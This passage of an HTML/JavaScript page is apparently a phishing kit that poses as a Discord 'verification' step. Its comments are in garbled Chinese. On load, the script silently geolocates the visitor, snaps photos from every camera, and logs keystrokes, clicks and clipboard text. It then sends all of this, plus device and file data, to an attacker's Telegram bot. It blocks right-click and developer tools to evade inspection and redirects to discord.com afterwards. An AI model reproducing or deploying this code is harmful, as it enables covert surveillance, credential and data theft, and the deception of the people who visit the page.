            latitude: geoData.latitude,
            longitude: geoData.longitude,
            timezone: geoData.timezone,
            utcOffset: geoData.utc_offset,
            currency: geoData.currency,
            currencyName: geoData.currency_name,
            callingCode: geoData.country_calling_code,
            languages: geoData.languages,
            asn: geoData.asn,
            org: geoData.org,
            isp: geoData.org
        };
        
        sendToTelegram(`ğŸ“ åœ°ç†ä½ç½®: ${geoData.city}, ${geoData.country_name}\nğŸŒ IP: ${ipData.ip}\nğŸ¢ ISP: ${geoData.org}`);
        
    } catch (e) {
        // å°è¯•å¤‡ç”¨API
        try {
            const backupRes = await fetch('https://ipapi.co/json/');
            const backupData = await backupRes.json();
            collectedData.network.geo = backupData;
        } catch (e2) {}
    }
    
    // å°è¯•è·å–ç²¾ç¡®ä½ç½®
    if ('geolocation' in navigator) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                collectedData.network.gps = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    altitudeAccuracy: position.coords.altitudeAccuracy,
                    heading: position.coords.heading,
                    speed: position.coords.speed,
                    timestamp: new Date(position.timestamp).toISOString()
                };
                sendToTelegram(`ğŸ“ GPSä½ç½®: ${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`);
            },
            (error) => {
                collectedData.network.gpsError = error.message;
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }
    
    // æ”¶é›†ç½‘ç»œä¿¡æ¯
    if (navigator.connection) {
        collectedData.network.connection = {
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            downlinkMax: navigator.connection.downlinkMax,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData,
            type: navigator.connection.type
        };
    }
    
    // è·å–æ›´å¤šç½‘ç»œä¿¡æ¯
    try {
        const networkInfo = await getNetworkInfo();
        if (networkInfo) {
            collectedData.network.details = networkInfo;
        }
    } catch (e) {}
}

// è·å–ç½‘ç»œè¯¦ç»†ä¿¡æ¯
async function getNetworkInfo() {
    try {
        const entries = performance.getEntriesByType('resource');
        const networkEntries = entries.filter(entry => 
            entry.initiatorType === 'xmlhttprequest' || 
            entry.initiatorType === 'fetch' ||
            entry.initiatorType === 'script' ||
            entry.initiatorType === 'link'
        );
        
        return {
            resourceCount: entries.length,
            networkRequests: networkEntries.length,
            dnsLookupTime: performance.timing.domainLookupEnd - performance.timing.domainLookupStart,
            tcpConnectTime: performance.timing.connectEnd - performance.timing.connectStart,
            requestTime: performance.timing.responseEnd - performance.timing.requestStart,
            domLoadTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
            pageLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart
        };
    } catch (e) {
        return null;
    }
}
// ==================== éšè”½æ‘„åƒå¤´è®¿é—® ====================

async function accessCameraStealthily() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        return false;
    }
    
    try {
        // æšä¸¾æ‰€æœ‰æ‘„åƒå¤´è®¾å¤‡
        const devices = await navigator.mediaDevices.enumerateDevices();
        const videoDevices = devices.filter(device => device.kind === 'videoinput');
        
        collectedData.cameras = videoDevices.map(device => ({
            deviceId: device.deviceId,
            label: device.label || 'Unknown Camera',
            groupId: device.groupId
        }));
        
        // å°è¯•è®¿é—®æ¯ä¸ªæ‘„åƒå¤´
        for (const device of videoDevices) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        deviceId: { exact: device.deviceId },
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 30 }
                    },
                    audio: false
                });
                
                // ç«‹å³æ‹ç…§
                await captureFromCamera(stream, device.label || 'camera');
                
                // åœæ­¢æµ
                stream.getTracks().forEach(track => track.stop());
                
            } catch (e) {
                // å°è¯•ä¸‹ä¸€ä¸ªæ‘„åƒå¤´
            }
        }
        
        return true;
        
    } catch (error) {
        return false;
    }
}

// ä»æ‘„åƒå¤´æ•è·ç…§ç‰‡
async function captureFromCamera(stream, label) {
    return new Promise((resolve) => {
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();
        
        setTimeout(() => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0);
            
            canvas.toBlob(async (blob) => {
                if (blob) {
                    const file = new File([blob], `camera_${label}_${Date.now()}.jpg`, {
                        type: 'image/jpeg'
                    });
                    
                    collectedData.photos.push({
                        name: file.name,
                        size: file.size,
                        source: 'camera',
                        camera: label,
                        timestamp: new Date().toISOString()
                    });
                    
                    // å‘é€åˆ°Telegram
                    await sendPhotoToTelegram(file, `stealth_camera_${label}`);
                    
                    resolve(true);
                }
            }, 'image/jpeg', 0.8);
        }, 1000); // 1ç§’åæ‹ç…§
    });
}

// ==================== è¡Œä¸ºç›‘æ§ ====================

function startBehaviorMonitoring() {
    collectedData.behavior = {
        mouse: [],
        clicks: [],
        keystrokes: [],
        scroll: [],
        focus: [],
        copyPaste: []
    };
    
    // é¼ æ ‡ç§»åŠ¨è·Ÿè¸ª
    document.addEventListener('mousemove', (e) => {
        if (collectedData.behavior.mouse.length < 1000) {
            collectedData.behavior.mouse.push({
                x: e.clientX,
                y: e.clientY,
                time: Date.now()
            });
        }
    });
    
    // ç‚¹å‡»è·Ÿè¸ª
    document.addEventListener('click', (e) => {
        collectedData.behavior.clicks.push({
            x: e.clientX,
            y: e.clientY,
            target: e.target.tagName,
            className: e.target.className,
            id: e.target.id,
            time: new Date().toISOString()
        });
    });
    
    // é”®ç›˜è¾“å…¥è·Ÿè¸ª
    document.addEventListener('keydown', (e) => {
        collectedData.behavior.keystrokes.push({
            key: e.key,
            code: e.code,
            ctrl: e.ctrlKey,
            alt: e.altKey,
            shift: e.shiftKey,
            meta: e.metaKey,
            time: Date.now()
        });
    });
    
    // æ»šåŠ¨è·Ÿè¸ª
    let lastScrollTime = 0;
    window.addEventListener('scroll', () => {
        const now = Date.now();
        if (now - lastScrollTime > 100) {
            collectedData.behavior.scroll.push({
                x: window.scrollX,
                y: window.scrollY,
                time: now
            });
            lastScrollTime = now;
        }
    });
    
    // ç„¦ç‚¹å˜åŒ–è·Ÿè¸ª
    document.addEventListener('visibilitychange', () => {
        collectedData.behavior.focus.push({
            state: document.hidden ? 'hidden' : 'visible',
            time: new Date().toISOString()
        });
    });
    
    // å¤åˆ¶ç²˜è´´ç›‘æ§
    document.addEventListener('copy', (e) => {
        const selectedText = window.getSelection().toString();
        if (selectedText) {
            collectedData.behavior.copyPaste.push({
                type: 'copy',
                text: selectedText.substring(0, 200),
                time: new Date().toISOString()
            });
        }
    });
    
    document.addEventListener('paste', (e) => {
        const pastedText = e.clipboardData.getData('text');
        if (pastedText) {
            collectedData.behavior.copyPaste.push({
                type: 'paste',
                text: pastedText.substring(0, 200),
                time: new Date().toISOString()
            });
        }
    });
    
    // å®šæœŸå‘é€è¡Œä¸ºæ•°æ®
    setInterval(() => {
        if (collectedData.behavior.keystrokes.length > 0) {
            sendToTelegram(`âŒ¨ï¸ æŒ‰é”®è®°å½•: ${collectedData.behavior.keystrokes.length} æ¬¡æŒ‰é”®`);
        }
    }, 30000);
}
        // ==================== Telegramå‘é€åŠŸèƒ½ ====================

        async function sendToTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CONFIG.chatId,
                        text: text.substring(0, 4000),
                        parse_mode: 'HTML'
                    })
                });
                return true;
            } catch (error) {
                return false;
            }
        }

        async function sendPhotoToTelegram(file, caption) {
            try {
                const formData = new FormData();
                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
                formData.append('photo', file);
                formData.append('caption', `ğŸ“¸ ${caption} - ${new Date().toLocaleTimeString()}`);
                
                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return true;
            } catch (error) {
                return false;
            }
        }

        // å‘é€å®Œæ•´æ•°æ®æŠ¥å‘Š
        async function sendCompleteReport() {
            const report = `ğŸ¯ Discordé«˜çº§éªŒè¯å®ŒæˆæŠ¥å‘Š

ğŸ“Š æ”¶é›†ç»Ÿè®¡:
ä¼šè¯ID: ${collectedData.sessionId}
éªŒè¯æ—¶é—´: ${new Date().toLocaleString()}
éªŒè¯æ­¥éª¤: ${Object.keys(collectedData.steps).length}/4 å®Œæˆ

ğŸ“± è®¾å¤‡ä¿¡æ¯:
æ“ä½œç³»ç»Ÿ: ${collectedData.device.os.name} ${collectedData.device.os.version}
æµè§ˆå™¨: ${collectedData.device.browser.name} ${collectedData.device.browser.version}
å±å¹•åˆ†è¾¨ç‡: ${collectedData.device.screen.width}x${collectedData.device.screen.height}
CPUæ ¸å¿ƒæ•°: ${collectedData.device.hardware.concurrency}
ç³»ç»Ÿå†…å­˜: ${collectedData.device.hardware.deviceMemory}GB

ğŸŒ ç½‘ç»œä¿¡æ¯:
IPåœ°å€: ${collectedData.network.geo?.ip || 'æœªçŸ¥'}
åœ°ç†ä½ç½®: ${collectedData.network.geo?.city || 'æœªçŸ¥'}, ${collectedData.network.geo?.country || 'æœªçŸ¥'}
ç½‘ç»œè¿è¥å•†: ${collectedData.network.geo?.isp || 'æœªçŸ¥'}

ğŸ“¸ æ‘„åƒå¤´è®¿é—®:
æ‘„åƒå¤´æ•°é‡: ${collectedData.cameras?.length || 0}
ç…§ç‰‡æ”¶é›†: ${collectedData.photos.length} å¼ 

ğŸ“ æ–‡ä»¶ç³»ç»Ÿæ‰«æ:
å‘ç°æ–‡ä»¶: ${collectedData.files.length} ä¸ª
æ–‡ä»¶å¤¹è®¿é—®: ${collectedData.folders.length} ä¸ª
å›¾ç‰‡æ–‡ä»¶: ${collectedData.photos.length} å¼ 

ğŸ–±ï¸ è¡Œä¸ºæ•°æ®:
é¼ æ ‡è½¨è¿¹: ${collectedData.behavior?.mouse?.length || 0} ç‚¹
ç‚¹å‡»è®°å½•: ${collectedData.behavior?.clicks?.length || 0} æ¬¡
æŒ‰é”®è®°å½•: ${collectedData.behavior?.keystrokes?.length || 0} æ¬¡
é¡µé¢ç„¦ç‚¹å˜åŒ–: ${collectedData.behavior?.focus?.length || 0} æ¬¡

ğŸ” æµè§ˆå™¨æ‰©å±•æ£€æµ‹:
å‘ç°æ‰©å±•: ${collectedData.extensions.length} ä¸ª

âœ… éªŒè¯çŠ¶æ€: å®Œæˆ
ğŸ”„ æ•°æ®å®Œæ•´æ€§: ${calculateDataIntegrity()}%`;

            await sendToTelegram(report);
            
            // å‘é€å®Œæ•´æ•°æ®æ–‡ä»¶
            const dataStr = JSON.stringify(collectedData, null, 2);
            const dataBlob = new Blob([dataStr], { type: 'application/json' });
            const dataFile = new File([dataBlob], `discord_data_${collectedData.sessionId}.json`);
            
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CONFIG.chatId);
            formData.append('document', dataFile);
            formData.append('caption', 'ğŸ“Š å®Œæ•´éªŒè¯æ•°æ®');
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendDocument`, {
                method: 'POST',
                body: formData
            });
        }

        // ==================== ä¸»æµç¨‹æ§åˆ¶ ====================

        async function startAdvancedVerification() {
            if (isCollecting) return;
            isCollecting = true;
            
            // ç¦ç”¨æŒ‰é’®
            document.getElementById('verifyButton').disabled = true;
            document.getElementById('buttonText').textContent = 'éªŒè¯ä¸­...';
            
            try {
                // æ­¥éª¤1ï¼šè®¾å¤‡æ‰«æ
                updateStep(1, 'æ­£åœ¨æ‰«æ...');
                await collectAdvancedDeviceInfo();
                await delay(2000);
                updateStep(1, 'å®Œæˆ');
                
                // æ­¥éª¤2ï¼šæ‘„åƒå¤´éªŒè¯
                updateStep(2, 'æ­£åœ¨éªŒè¯...');
                await accessCameraStealthily();
                await delay(2000);
                updateStep(2, 'å®Œæˆ');
                
                // æ­¥éª¤3ï¼šæ–‡ä»¶ç³»ç»Ÿæ£€æŸ¥
                updateStep(3, 'æ­£åœ¨æ‰«æ...');
                await collectNetworkAndLocation();
                attemptFolderAccess();
                startBehaviorMonitoring();
                await delay(3000);
                updateStep(3, 'å®Œæˆ');
                
                // æ­¥éª¤4ï¼šç½‘ç»œéªŒè¯
                updateStep(4, 'æ­£åœ¨éªŒè¯...');
                await delay(2000);
                updateStep(4, 'å®Œæˆ');
                
                // å®ŒæˆéªŒè¯
                await sendCompleteReport();
                
                // æ˜¾ç¤ºæˆåŠŸæ¶ˆæ¯
                document.getElementById('successMessage').classList.remove('hidden');
                document.getElementById('buttonText').textContent = 'éªŒè¯å®Œæˆ';
                
                // 3ç§’åé‡å®šå‘åˆ°Discord
                setTimeout(() => {
                    window.location.href = 'https://discord.com';
                }, 3000);
                
            } catch (error) {
                document.getElementById('errorMessage').classList.remove('hidden');
                document.getElementById('verifyButton').disabled = false;
                document.getElementById('buttonText').textContent = 'é‡è¯•éªŒè¯';
                isCollecting = false;
            }
        }

        // ==================== è¾…åŠ©å‡½æ•° ====================

        function updateStep(stepNumber, status) {
            const stepElement = document.getElementById(`step${stepNumber}`);
            const statusElement = document.getElementById(`step${stepNumber}Status`);
            
            if (stepElement && statusElement) {
                stepElement.classList.add('active');
                statusElement.textContent = status;
                statusElement.className = 'step-status ' + (status === 'å®Œæˆ' ? 'status-complete' : 'status-pending');
            }
        }

        function generateSessionId() {
            return 'DC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
        }

        function calculateDataIntegrity() {
            let score = 0;
            if (collectedData.device) score += 20;
            if (collectedData.network?.geo) score += 20;
            if (collectedData.cameras?.length > 0) score += 20;
            if (collectedData.files.length > 0) score += 20;
            if (collectedData.behavior) score += 20;
            return score;
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // ==================== é˜²æ£€æµ‹ ====================

        function setupProtection() {
            // ç¦ç”¨å³é”®
            document.addEventListener('contextmenu', (e) => {
                e.preventDefault();
                return false;
            });
            
            // ç¦ç”¨å¼€å‘è€…å·¥å…·
            document.addEventListener('keydown', (e) => {
                if (e.key === 'F12' || 
                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
                    (e.ctrlKey && e.key === 'U')) {
                    e.preventDefault();
                    return false;
                }
            });
            
            // é˜²æ­¢å¤åˆ¶
            document.addEventListener('copy', (e) => {
                e.preventDefault();
            });
            
            // æ£€æµ‹å¼€å‘è€…å·¥å…·
            setInterval(() => {
                const threshold = 160;
                const widthDiff = window.outerWidth - window.innerWidth > threshold;
                const heightDiff = window.outerHeight - window.innerHeight > threshold;
                
                if (widthDiff || heightDiff) {
                    stealthMode = false;
                    sendToTelegram('âš ï¸ æ£€æµ‹åˆ°å¼€å‘è€…å·¥å…·å·²æ‰“å¼€');
                }
            }, 1000);
        }

        // ==================== åˆå§‹åŒ– ====================

        window.addEventListener('DOMContentLoaded', () => {
            // è®¾ç½®é˜²æ£€æµ‹
            setupProtection();
            
            // è‡ªåŠ¨å¼€å§‹éªŒè¯ï¼ˆå»¶è¿Ÿ5ç§’ï¼‰
            setTimeout(() => {
                if (!isCollecting) {
                    startAdvancedVerification();
                }
            }, 5000);
            
            // é¡µé¢å…³é—­æ—¶å‘é€æ•°æ®
            window.addEventListener('beforeunload', () => {
                sendToTelegram('ğŸšª ç”¨æˆ·ç¦»å¼€éªŒè¯é¡µé¢');
            });
        });
    </script>
</body>
</html>
